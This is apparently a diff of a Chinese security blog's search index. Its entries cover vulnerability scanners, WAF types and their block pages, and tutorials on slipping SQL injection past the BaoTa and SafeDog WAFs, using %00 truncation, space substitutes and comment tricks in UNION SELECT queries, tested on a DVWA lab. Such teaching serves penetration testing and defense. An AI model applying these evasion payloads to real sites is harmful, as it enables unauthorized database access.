-<h2 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h2><p>OpenVAS 是一个全功能的漏洞扫描器。它的功能包括非认证测试、认证测试、各种高水平和低水平的互联网和工业协议、大规模扫描的性能调整和一个强大的内部编程语言来实现任何类型的漏洞测试。</p>
-<p>使用Kali Linux 进行安装、扫描教程：</p>
-<p><a href="https://www.kali.org/blog/openvas-vulnerability-scanning/">https://www.kali.org/blog/openvas-vulnerability-scanning/</a></p>
-<h2 id="Nexpose"><a href="#Nexpose" class="headerlink" title="Nexpose"></a>Nexpose</h2><p>Rapid7 Nexpose是一款面向大型网络组织的安全风险智能解决方案。</p>
-<p>Nexpose主动支持整个漏洞管理生命周期，包括发现，检测，验证，风险分类，影响分析，报告和缓解。</p>
-<p>官网地址：<a href="https://www.rapid7.com/products/nexpose/">https://www.rapid7.com/products/nexpose/</a></p>
-<p>下载与安装教程：<a href="https://www.fujieace.com/hacker/rapid7-nexpose.html">https://www.fujieace.com/hacker/rapid7-nexpose.html</a></p>
-<p>使用教程：<a href="https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html">https://www.yiibai.com/ethical_hacking/ethical-hacking-nexpose-analysis.html</a></p>
-<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscan是一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</p>
-<p>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
-<p>项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
@@ -2872,6 +2872,35 @@
       </tags>
   </entry>
   <entry>
+    <title>WAF-Bypass之SQL注入绕过宝塔</title>
+    <url>/post/30ff95f0.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
+<p>数据库：MySQL 5.6.50</p>
+<p>Web脚本：PHP 5.6.40</p>
+<p>WAF：宝塔Linux面板 v7.6.0企业版-Apache防火墙</p>
+<p><img src="https://i.loli.net/2021/10/27/yupzNAs62GlkwtY.png" alt="image-20211027210853516"></p>
+<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：%00时会被认为读取已结束</strong></p>
+<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留。</p>
+<p>%00截断是上传漏洞中常用的一个非常经典的姿势，在SQL注入中，也可以用来Bypass。在WAF层，接收参数id后，遇到%00截断，只获取到 id=1，无法获取到后面的有害参数输入。</p>
+<p><img src="https://i.loli.net/2021/10/27/m9J84eD31iGwgNy.png" alt="image-20211027211938316"></p>
+<blockquote>
+<p>注：宝塔的规则也写得非常严格，单从规则的角度来看无法完美地实现绕过，且Apache也不像IIS，能利用的协议特性较少，暂时只这发现这一种绕过思路。</p>
+</blockquote>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
+<li><a href="https://blog.csdn.net/qq_26090065/article/details/81458937">00截断原理分析_小水池-CSDN博客_00截断</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>WAF-Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WAF-Bypass之SQL注入绕过D盾</title>
     <url>/post/f020bf7f.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="SQLServer特性"><a href="#SQLServer特性" class="headerlink" title="SQLServer特性"></a>SQLServer特性</h3><p><strong>空格可以由其它字符替代</strong></p>
@@ -3018,35 +3047,6 @@
 <li><a href="https://blog.csdn.net/zhangge3663/article/details/116394692">干货|各种WAF绕过手法学习_zhangge3663的博客-CSDN博客</a></li>
 <li><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448903605&amp;idx=1&amp;sn=5a8df50ef8efbd5293fcf3a8712cd1b8&amp;scene=21#wechat_redirect">Bypass D盾_防火墙（新版）SQL注入防御 (qq.com)</a></li>
 <li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>WAF-Bypass</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WAF-Bypass之SQL注入绕过宝塔</title>
-    <url>/post/30ff95f0.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="实验靶场"><a href="#实验靶场" class="headerlink" title="实验靶场"></a>实验靶场</h3><p>靶场：DVWA（low级别）</p>
-<p>数据库：MySQL 5.6.50</p>
-<p>Web脚本：PHP 5.6.40</p>
-<p>WAF：宝塔Linux面板 v7.6.0企业版-Apache防火墙</p>
-<p><img src="https://i.loli.net/2021/10/27/yupzNAs62GlkwtY.png" alt="image-20211027210853516"></p>
-<h2 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h2><h3 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h3><p><strong>规则缺陷/特性：%00时会被认为读取已结束</strong></p>
-<p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留。</p>
-<p>%00截断是上传漏洞中常用的一个非常经典的姿势，在SQL注入中，也可以用来Bypass。在WAF层，接收参数id后，遇到%00截断，只获取到 id=1，无法获取到后面的有害参数输入。</p>
-<p><img src="https://i.loli.net/2021/10/27/m9J84eD31iGwgNy.png" alt="image-20211027211938316"></p>
-<blockquote>
-<p>注：宝塔的规则也写得非常严格，单从规则的角度来看无法完美地实现绕过，且Apache也不像IIS，能利用的协议特性较少，暂时只这发现这一种绕过思路。</p>
-</blockquote>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a href="https://www.cnblogs.com/xiaozi/p/9138160.html">Bypass 护卫神SQL注入防御（多姿势） - Bypass - 博客园 (cnblogs.com)</a></li>
-<li><a href="https://blog.csdn.net/qq_26090065/article/details/81458937">00截断原理分析_小水池-CSDN博客_00截断</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -4934,6 +4934,128 @@
       </tags>
   </entry>
   <entry>
+    <title>WAF-Bypass之WAF介绍与分析</title>
+    <url>/post/e1e1fb64.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WAF的介绍"><a href="#WAF的介绍" class="headerlink" title="WAF的介绍"></a>WAF的介绍</h2><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
+<p><img src="https://i.loli.net/2021/10/13/TE9WZhcpn1gP5je.png" alt="image-20211013192504092"></p>
+<h2 id="WAF的工作原理"><a href="#WAF的工作原理" class="headerlink" title="WAF的工作原理"></a>WAF的工作原理</h2><p>WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录。</p>
+<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p>
+<h3 id="规则检测"><a href="#规则检测" class="headerlink" title="规则检测"></a>规则检测</h3><p>每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
+<h3 id="处理模块"><a href="#处理模块" class="headerlink" title="处理模块"></a>处理模块</h3><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。</p>
+<h3 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h3><p>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
+<h3 id="WAF的防御思想"><a href="#WAF的防御思想" class="headerlink" title="WAF的防御思想"></a>WAF的防御思想</h3><p><strong>攻击的特点</strong>：</p>
+<ul>
+<li>攻击二象性：已知攻击与未知攻击</li>
+<li>攻击的两个维度：形式与漏洞</li>
+</ul>
+<p><strong>核心原理</strong>：</p>
+<ul>
+<li>运用‘黑’、‘白’思想</li>
+<li>特征匹配、漏洞签名</li>
+<li>对匹配结果进行响应(拦截、记录)</li>
+</ul>
+<h2 id="WAF的分类"><a href="#WAF的分类" class="headerlink" title="WAF的分类"></a>WAF的分类</h2><h3 id="云WAF"><a href="#云WAF" class="headerlink" title="云WAF"></a>云WAF</h3><p><strong>优点</strong>：</p>
+<ul>
+<li>快速部署、零维护、低成本：无需安装任何软件或者部署任何硬件设备，只需修改DNS即可将网站部署到云WAF的防护范围之内。对中小型企业的网络管理员和个人站长有很大吸引力。</li>
+<li>用户无需更新：云WAF的防护规则都处于云端，新漏洞爆发时，由云端负责规则的更新和维护，用户无需担心因为疏忽导致受到新型的漏洞攻击。</li>
+<li>可充当CDN：云WAF在提供防护功能的同时，还同时具有CDN的功能，在进行防护的同时还可以提高网站访问的速率，CDN通过跨运营商的多线智能解析调度将静态资源动态负载到全国的云节点，用户访问某个资源时会被引导至最近的云端节点从而提高访问速度。</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>存在轻易被绕过的风险：云WAF的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云WAF对服务器发起攻击。</li>
+<li>可靠性低：云WAF处理一次请求，其中需要经过DNS解析、请求调度、流量过滤等环节，其中涉及协同关联工作，其中只要有一个环节出现问题，就会导致网站无法访问。必要时，只能手动切换为原DNS来保证业务正常运行，而域名解析需要一定时间，则会导致网站短时间无法正常访问。</li>
+<li>保密性低：网站访问数据对于一些企业、机构来说为保密数据，里面可能包含用户的隐私或者商业信息，这些数据自行管控会相对安全，但是如果使用WAF，所有的数据会记录到云端，这相当于数据被别人保管，可能存在一定的泄露风险。</li>
+</ul>
+<p><strong>主流产品</strong>：阿里云盾、cloudflare、百度云加速、腾讯云安全、深信服云WAF、创宇盾、加速乐、安全宝</p>
+<h3 id="软件WAF"><a href="#软件WAF" class="headerlink" title="软件WAF"></a>软件WAF</h3><p><strong>优点</strong>：</p>
+<ul>
+<li>安装简单、使用方便、成本低：采用纯软件的方式实现</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>安全性和可靠性低：软件WAF必须安装Web应用服务器上，所以，除了性能受到限制，还可能存在兼容性、安全性不足及升级成本较高等问题。</li>
+</ul>
+<p><strong>主流产品</strong>：网站安全狗、云锁、D盾、宝塔面板、ModSecurity、Naxsi、360网站卫士、360webscan</p>
+<h3 id="硬件WAF"><a href="#硬件WAF" class="headerlink" title="硬件WAF"></a>硬件WAF</h3><p><strong>优点</strong>：</p>
+<ul>
+<li>可承受较高的吞吐量。</li>
+<li>性能好、功能全、支持多种部署方式</li>
+<li>即插即用：由于硬件防部署简易，硬件WAF只需串联到网络中，进行简单的配置后即可实现Web安全防护。</li>
+<li>防护范围大：由于硬件防火墙直接串联到了交换机，所以在同一个交换机下的所有服务器，都处于防火墙的防护范围之类。</li>
+</ul>
+<p><strong>缺点</strong>：</p>
+<ul>
+<li>价格昂贵，动辄几十万。</li>
+<li>存在一定误杀：由于硬件WAF是通过攻击规则库对异常流量进行识别，所以在业务系统复杂的情况下，可能存在一定误杀导致正常功能被防火墙拦截导致影响正常业务。</li>
+<li>存在一定绕过机率：硬件防火墙对HTTP协议进行自行解析，可能存在与Web服务器对HTTP请求的理解不一致从而导致被绕过。</li>
+</ul>
+<p><strong>主流厂商</strong>：启明星辰、安恒、绿盟、天融信、飞塔</p>
+<h3 id="自定义WAF"><a href="#自定义WAF" class="headerlink" title="自定义WAF"></a>自定义WAF</h3><p>我们在平时的渗透测试中，更多情况下会遇到的是网站开发人员自己写的防护规则。网站开发人员为了网站的安全，会在可能遭受攻击的地方增加一些安全防护代码，比如过滤敏感字符，对潜在的威胁的字符进行编码、转义等。</p>
+<h2 id="WAF的部署模式"><a href="#WAF的部署模式" class="headerlink" title="WAF的部署模式"></a>WAF的部署模式</h2><h3 id="基于DNS解析的云WAF"><a href="#基于DNS解析的云WAF" class="headerlink" title="基于DNS解析的云WAF"></a>基于DNS解析的云WAF</h3><p>修改DNS，让域名解析到反向代理服务器。所有流量经过反向代理进行检测，检测无问题之后再转发给后端的Web服务器。</p>
+<p><img src="https://i.loli.net/2021/10/13/BO6zTMUWfyswQXY.png" alt="image-20211013200415493"></p>
+<h3 id="串联模式"><a href="#串联模式" class="headerlink" title="串联模式"></a>串联模式</h3><p>硬件防护设备串在网络链路中，所有的流量经过核心交换机引流到防护设备中，在防护设备中对请求进行检测，合法的请求会把流量发送给Web服务器。当发现攻击行为时，会阻断该请求，后端Web服务器无感知到任何请求。</p>
+<h4 id="反向代理模式"><a href="#反向代理模式" class="headerlink" title="反向代理模式"></a>反向代理模式</h4><p>WAF作为反向代理服务器向后端服务器转发收到的HTTP请求，在转发的同时会对经过的HTTP请求做攻击检测。</p>
+<p>但该模式会改变现有网络结构，用户真实IP会以HTTP Header传递给后端web服务器，需要提前配置好域名与目的服务器的转发规则，在站点和后端Web服务器较多的情况下，转发规则等配置较复杂。</p>
+<p><img src="https://i.loli.net/2021/10/13/aDk4bswpCzfmvYH.png" alt="image-20211013204206923"></p>
+<h4 id="透明代理模式"><a href="#透明代理模式" class="headerlink" title="透明代理模式"></a>透明代理模式</h4><p>WAF将客户端与web服务器之间TCP连接监控下来。在用户无感知的情况下代理了WEB客户端和服务器之间的会话，并基于桥模式进行转发。从WEB客户端的角度看，WEB客户端仍然是直接访问服务器。</p>
+<p>从WAF工作转发原理看和透明网桥转发一样，因而称之为透明代理模式。该方式的特点是：对网络的改动最小，可以实现零配置部署。</p>
+<p><img src="https://i.loli.net/2021/10/13/WE5du69PhSpbcOV.png" alt="image-20211013204502126"></p>
+<h3 id="旁路模式"><a href="#旁路模式" class="headerlink" title="旁路模式"></a>旁路模式</h3><p>利用交换机的端口镜像功能，将业务流量转发一份给WAF，WAF只对业务流量进行监控和报警，不进行拦截阻断。对于WAF而言，流量只进不出。</p>
+<p>该模式的特点是：在WAF出故障的情况下，不影响业务连续性。但是需要联动其他设备(如出口防火墙)来下发阻断策略。</p>
+<p><img src="https://i.loli.net/2021/10/13/jUYgnTHedQFhISW.png" alt="image-20211013204644602"></p>
+<h3 id="软件嵌入中间件-检测引擎模式"><a href="#软件嵌入中间件-检测引擎模式" class="headerlink" title="软件嵌入中间件 + 检测引擎模式"></a>软件嵌入中间件 + 检测引擎模式</h3><p>​    </p>
+<p><img src="https://i.loli.net/2021/10/13/GZwQ5FTdUfJ1a8S.png" alt="image-20211013204950399"></p>
+<h2 id="WAF绕过的实现"><a href="#WAF绕过的实现" class="headerlink" title="WAF绕过的实现"></a>WAF绕过的实现</h2><h3 id="WAF为什么会被绕过？"><a href="#WAF为什么会被绕过？" class="headerlink" title="WAF为什么会被绕过？"></a>WAF为什么会被绕过？</h3><ul>
+<li>鱼（安全）与 熊掌（业务性能）不可兼得</li>
+<li>WAF为了考虑通用性的问题，无法100%覆盖某些语言、中间件、数据库的特性；</li>
+<li>硬件WAF自身往往存在漏洞</li>
+</ul>
+<h3 id="WAF绕过的角度"><a href="#WAF绕过的角度" class="headerlink" title="WAF绕过的角度"></a>WAF绕过的角度</h3><ul>
+<li><strong>资源限制</strong> ———————（如通过超大数据包绕过WAF）</li>
+<li><strong>架构</strong> ———————（如通过DNS解析等寻找真实IP来绕过云WAF）</li>
+<li><strong>规则缺陷</strong>/<strong>特性</strong> ———————（如利用正则匹配缺陷、数据库特性、中间件特性等绕过WAF）</li>
+<li><strong>协议</strong> ———————（如针对HTTP_0.9版本下TCP长链接情况下的绕过）</li>
+</ul>
+<p>之后的WAF Bypass也会从这几个角度分析，绕过各种WAF。</p>
+<h2 id="不同WAF拦截告警页面"><a href="#不同WAF拦截告警页面" class="headerlink" title="不同WAF拦截告警页面"></a>不同WAF拦截告警页面</h2><p>不同的WAF产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款WAF产品，从而有目的性的进行WAF绕过。</p>
+<h3 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h3><p><strong>旧版</strong>：</p>
+<p><img src="https://i.loli.net/2021/10/13/nB3T4CL26jVOhK5.png" alt="image-20211013231932526"></p>
+<p><strong>新版</strong>：</p>
+<p><img src="https://i.loli.net/2021/10/13/B4oj93meSkDN7X6.png" alt="image-20211013231857602"></p>
+<h3 id="D盾"><a href="#D盾" class="headerlink" title="D盾"></a>D盾</h3><p><img src="https://i.loli.net/2021/10/13/BTeAwgRkQXl5jmP.png" alt="image-20211013232137219"></p>
+<h3 id="西数WTS-WAF"><a href="#西数WTS-WAF" class="headerlink" title="西数WTS-WAF"></a>西数WTS-WAF</h3><p><img src="https://i.loli.net/2021/10/13/TbSFjlM3GkJvnVI.png" alt="img"></p>
+<h3 id="云锁"><a href="#云锁" class="headerlink" title="云锁"></a>云锁</h3><p><img src="https://i.loli.net/2021/10/13/X7uHVW8Snf1qIUc.png" alt="img"></p>
+<h3 id="宝塔网站防火墙"><a href="#宝塔网站防火墙" class="headerlink" title="宝塔网站防火墙"></a>宝塔网站防火墙</h3><p><img src="https://i.loli.net/2021/10/13/a7vXxRNwoDWQzZf.png" alt="image-20211013232423393"></p>
+<h3 id="安全宝"><a href="#安全宝" class="headerlink" title="安全宝"></a>安全宝</h3><p><img src="https://i.loli.net/2021/10/13/dhE1mGx2zf7eZlX.png" alt="image-20211013234028253"></p>
+<h3 id="护卫神"><a href="#护卫神" class="headerlink" title="护卫神"></a>护卫神</h3><p><img src="https://i.loli.net/2021/10/13/P4ogsQFXAWcI3wh.png" alt="img"></p>
+<h3 id="UPUPW"><a href="#UPUPW" class="headerlink" title="UPUPW"></a>UPUPW</h3><p><img src="https://i.loli.net/2021/10/13/AW7bz8kLPMomS1I.png" alt="img"></p>
+<h3 id="阿里云盾"><a href="#阿里云盾" class="headerlink" title="阿里云盾"></a>阿里云盾</h3><p><img src="https://i.loli.net/2021/10/13/pADYIxnVw2hERme.png" alt="img"></p>
+<h3 id="CloudFlare"><a href="#CloudFlare" class="headerlink" title="CloudFlare"></a>CloudFlare</h3><p><img src="https://i.loli.net/2021/10/13/SzwFKj6QlUdqsnT.png" alt="image-20211013232237378"></p>
+<h3 id="创宇盾"><a href="#创宇盾" class="headerlink" title="创宇盾"></a>创宇盾</h3><p><img src="https://i.loli.net/2021/10/13/GCysZ7FEHo8P5Ya.png" alt="img"></p>
+<h3 id="玄武盾"><a href="#玄武盾" class="headerlink" title="玄武盾"></a>玄武盾</h3><p><img src="https://i.loli.net/2021/10/13/4YsNCluj6cRzvbL.png" alt="image-20211013233123284"></p>
+<h3 id="蓝盾"><a href="#蓝盾" class="headerlink" title="蓝盾"></a>蓝盾</h3><p><img src="https://i.loli.net/2021/10/13/2GEfa8wDTlienRP.png" alt="image-20211013234111708"></p>
+<h3 id="DuEdge百度边缘网络计算"><a href="#DuEdge百度边缘网络计算" class="headerlink" title="DuEdge百度边缘网络计算"></a>DuEdge百度边缘网络计算</h3><p><img src="https://i.loli.net/2021/10/13/eAVETpOaRbzQgqY.png" alt="image-20211013233354082"></p>
+<h3 id="腾讯云"><a href="#腾讯云" class="headerlink" title="腾讯云"></a>腾讯云</h3><p><img src="https://i.loli.net/2021/10/13/xiJtU4V32BmWzXY.png" alt="img"></p>
+<h3 id="百度云"><a href="#百度云" class="headerlink" title="百度云"></a>百度云</h3><p><img src="https://i.loli.net/2021/10/13/5UlW3hSm9OjbIYM.png" alt="img"></p>
+<h3 id="华为云"><a href="#华为云" class="headerlink" title="华为云"></a>华为云</h3><p><img src="https://i.loli.net/2021/10/13/oFm8vNZaPTt1jOb.png" alt="img"></p>
+<h3 id="360webscan"><a href="#360webscan" class="headerlink" title="360webscan"></a>360webscan</h3><p><img src="https://i.loli.net/2021/10/13/PaAlbG5K86RQzq1.png" alt="img"></p>
+<h3 id="360安域"><a href="#360安域" class="headerlink" title="360安域"></a>360安域</h3><p><img src="https://i.loli.net/2021/10/13/cDw6SLsRe3QBAb1.png" alt="image-20211013234002168"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li>ZP《Bypass安全狗mysql注入》</li>
+<li><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇 - FreeBuf网络安全行业门户</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1728133">干货 | 常见WAF拦截页面总结 - 云+社区 - 腾讯云 (tencent.com)</a></li>
+<li><a href="https://mp.weixin.qq.com/s/kRrELJquobgnXXz2ItRNxw">Waf识别工具和83个Waf拦截页面 (qq.com)</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>WAF-Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQLServer数据库注入攻击方式</title>
     <url>/post/6daae3c4.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQLServer数据库基本知识"><a href="#SQLServer数据库基本知识" class="headerlink" title="SQLServer数据库基本知识"></a>SQLServer数据库基本知识</h2><h3 id="SQLServer数据库介绍"><a href="#SQLServer数据库介绍" class="headerlink" title="SQLServer数据库介绍"></a>SQLServer数据库介绍</h3><p>SQLServer是美国Microsoft公司推出的一种关系型数据库系统。SQLServer是一个可扩展的、高性能的、为分布式客户机/服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。SQLServer数据库也称MSSQL数据库。</p>
@@ -5421,117 +5543,201 @@
       </tags>
   </entry>
   <entry>
-    <title>WAF-Bypass之WAF介绍与分析</title>
-    <url>/post/e1e1fb64.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WAF的介绍"><a href="#WAF的介绍" class="headerlink" title="WAF的介绍"></a>WAF的介绍</h2><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
-<p><img src="https://i.loli.net/2021/10/13/TE9WZhcpn1gP5je.png" alt="image-20211013192504092"></p>
-<h2 id="WAF的工作原理"><a href="#WAF的工作原理" class="headerlink" title="WAF的工作原理"></a>WAF的工作原理</h2><p>WAF的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录。</p>
-<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理阶段首先在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p>
-<h3 id="规则检测"><a href="#规则检测" class="headerlink" title="规则检测"></a>规则检测</h3><p>每一种WAF产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
-<h3 id="处理模块"><a href="#处理模块" class="headerlink" title="处理模块"></a>处理模块</h3><p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。</p>
-<h3 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h3><p>WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
-<h3 id="WAF的防御思想"><a href="#WAF的防御思想" class="headerlink" title="WAF的防御思想"></a>WAF的防御思想</h3><p><strong>攻击的特点</strong>：</p>
+    <title>WAF-Bypass之SQL注入绕过安全狗</title>
+    <url>/post/6c2dcc62.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Bypass安全狗MySQL注入"><a href="#Bypass安全狗MySQL注入" class="headerlink" title="Bypass安全狗MySQL注入"></a>Bypass安全狗MySQL注入</h2><h3 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h3><p><strong>空格可以由其它字符替代</strong></p>
+<blockquote>
+<p>select id,contents,time from news where news_id=1<span style="color:red">①</span>union<span style="color:red">②</span>select<span style="color:red">③</span>1,2,username<span style="color:red">④</span>from<span style="color:red">⑤</span>admin</p>
+</blockquote>
 <ul>
-<li>攻击二象性：已知攻击与未知攻击</li>
-<li>攻击的两个维度：形式与漏洞</li>
-</ul>
-<p><strong>核心原理</strong>：</p>
+<li><p>位置①</p>
 <ul>
-<li>运用‘黑’、‘白’思想</li>
-<li>特征匹配、漏洞签名</li>
-<li>对匹配结果进行响应(拦截、记录)</li>
+<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
+<li>可以利用注释符号替换空格：/**/、%23est%0d%0a、 —+a%0d%0a</li>
+<li>可以利用数学运算以及数据类型：news_id=1.0，news_id=1E0，news_id=\N</li>
 </ul>
-<h2 id="WAF的分类"><a href="#WAF的分类" class="headerlink" title="WAF的分类"></a>WAF的分类</h2><h3 id="云WAF"><a href="#云WAF" class="headerlink" title="云WAF"></a>云WAF</h3><p><strong>优点</strong>：</p>
+</li>
+<li><p>位置②</p>
 <ul>
-<li>快速部署、零维护、低成本：无需安装任何软件或者部署任何硬件设备，只需修改DNS即可将网站部署到云WAF的防护范围之内。对中小型企业的网络管理员和个人站长有很大吸引力。</li>
-<li>用户无需更新：云WAF的防护规则都处于云端，新漏洞爆发时，由云端负责规则的更新和维护，用户无需担心因为疏忽导致受到新型的漏洞攻击。</li>
-<li>可充当CDN：云WAF在提供防护功能的同时，还同时具有CDN的功能，在进行防护的同时还可以提高网站访问的速率，CDN通过跨运营商的多线智能解析调度将静态资源动态负载到全国的云节点，用户访问某个资源时会被引导至最近的云端节点从而提高访问速度。</li>
+<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
+<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
+<li>可以利用括号：union(select 1,2)</li>
 </ul>
-<p><strong>缺点</strong>：</p>
+</li>
+<li><p>位置③</p>
 <ul>
-<li>存在轻易被绕过的风险：云WAF的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云WAF对服务器发起攻击。</li>
-<li>可靠性低：云WAF处理一次请求，其中需要经过DNS解析、请求调度、流量过滤等环节，其中涉及协同关联工作，其中只要有一个环节出现问题，就会导致网站无法访问。必要时，只能手动切换为原DNS来保证业务正常运行，而域名解析需要一定时间，则会导致网站短时间无法正常访问。</li>
-<li>保密性低：网站访问数据对于一些企业、机构来说为保密数据，里面可能包含用户的隐私或者商业信息，这些数据自行管控会相对安全，但是如果使用WAF，所有的数据会记录到云端，这相当于数据被别人保管，可能存在一定的泄露风险。</li>
+<li>可以利用其它控制字符替换空格：%09,%0a,%0b,%0c,%0d,%20,%a0</li>
+<li>可以利用注释符号替换空格：/**/、%23test%0d%0a、 —+a%0d%0a</li>
+<li>可以利用其它符号：+ 、- 、 ~ 、!、@</li>
 </ul>
-<p><strong>主流产品</strong>：阿里云盾、cloudflare、百度云加速、腾讯云安全、深信服云WAF、创宇盾、加速乐、安全宝</p>
-<h3 id="软件WAF"><a href="#软件WAF" class="headerlink" title="软件WAF"></a>软件WAF</h3><p><strong>优点</strong>：</p>
+</li>
+<li><p>位置④</p>
 <ul>
